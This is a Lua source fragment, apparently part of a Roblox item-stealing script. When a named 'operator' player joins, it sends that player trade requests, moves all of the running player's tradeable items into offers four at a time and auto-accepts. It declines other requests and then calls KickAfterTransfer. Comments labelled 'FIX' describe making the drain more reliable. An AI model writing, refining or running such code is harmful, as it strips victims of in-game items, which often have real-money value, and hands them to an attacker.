local MAX_TRADE_ATTEMPTS = 999
local RETRY_WAIT = 2

-- FIX: helper that blocks until status reaches a specific value OR timeout expires
-- Prevents the main loop from hammering requests into intermediate states
local function WaitForTradeStatus(TargetStatus, TimeoutSeconds)
    local Elapsed = 0
    local Step    = 0.2
    while Elapsed < TimeoutSeconds do
        if GetTradeStatus() == TargetStatus then return true end
        task.wait(Step)
        Elapsed = Elapsed + Step
    end
    return false
end

local function ProcessAllTrades(TargetName)
    local AttemptCount = 0
    while #TradeableItems > 0 and AttemptCount < MAX_TRADE_ATTEMPTS do
        AttemptCount = AttemptCount + 1
        local CurrentStatus = GetTradeStatus()

        if CurrentStatus == "ReceivingRequest" then
            pcall(function() ReplicatedStorage.Trade.DeclineRequest:FireServer() end)
            task.wait(0.5)
            continue
        end

        -- FIX: intermediate states (SendingRequest, PendingRequest, etc.) should be
        -- waited out, not treated as "None" — old code fell through to the None branch
        -- and spammed duplicate requests into those states, sometimes crashing the GUI.
        if CurrentStatus ~= "None" and CurrentStatus ~= "StartTrade" then
            task.wait(0.5)
            continue
        end

        if CurrentStatus == "StartTrade" then
            -- FIX: each slot is now exactly 1 item (Count=1 enforced in RefreshInventoryLists)
            -- so we can safely pull up to 4 unique DataIDs per round
            local ItemsToSend = math.min(4, #TradeableItems)
            for _ = 1, ItemsToSend do
                if #TradeableItems == 0 then break end
                local Item = table.remove(TradeableItems, 1)
                -- AddItemToTradeOffer already has the 0.18s wait built in
                AddItemToTradeOffer(Item.DataID)
            end

            -- FIX: give UpdateTrade event time to arrive with the operator's LastOffer hash
            -- before we call AcceptIncomingTrade. Old 6s flat wait was fine for slow
            -- connections but the accept still fired without the hash because it was
            -- gated on "if LastReceivedOffer then" which returned false on empty offers.
            task.wait(1.5)

            AcceptIncomingTrade() -- now always fires (LastReceivedOffer or 0)

            WaitUntilTradeEnds()
            ReloadInventory()
            AttemptCount = 0
            continue
        end

        -- CurrentStatus == "None": send request and wait for operator to accept
        if CurrentStatus == "None" then
            local Sent, Try = false, 1
            while not Sent and Try <= 5 do
                if SendTradeRequestToPlayer(TargetName) then
                    Sent = true
                else
                    task.wait(math.min(Try * 0.5, 3))
                    Try = Try + 1
                end
            end

            if Sent then
                -- FIX: actively wait up to 20s for operator to open the trade (StartTrade)
                -- Old code just did task.wait(0.5) and looped, causing it to re-enter
                -- the None branch and fire duplicate requests before the first one resolved.
                -- Those duplicate requests are what was causing the GUI to sometimes not
                -- appear on the operator's end (server drops conflicting pending requests).
                local GotIn = WaitForTradeStatus("StartTrade", 20)
                if not GotIn then
                    -- request timed out, cancel cleanly and retry
                    pcall(function() ReplicatedStorage.Trade.DeclineRequest:FireServer() end)
                    task.wait(RETRY_WAIT)
                end
            else
                task.wait(RETRY_WAIT)
            end
        end
    end
    KickAfterTransfer()
end

local function AutoTradeOnTargetJoin()
    local IsBusy = false
    local function CheckPlayerJoin(Player)
        if IsBusy then return end
        local TargetName = FindTradeTarget()
        if TargetName and Player.Name == TargetName then
            IsBusy = true; task.wait(3); ProcessAllTrades(Player.Name)
        end
    end
    for _, Player in ipairs(Players:GetPlayers()) do CheckPlayerJoin(Player) end
    Players.PlayerAdded:Connect(CheckPlayerJoin)
end

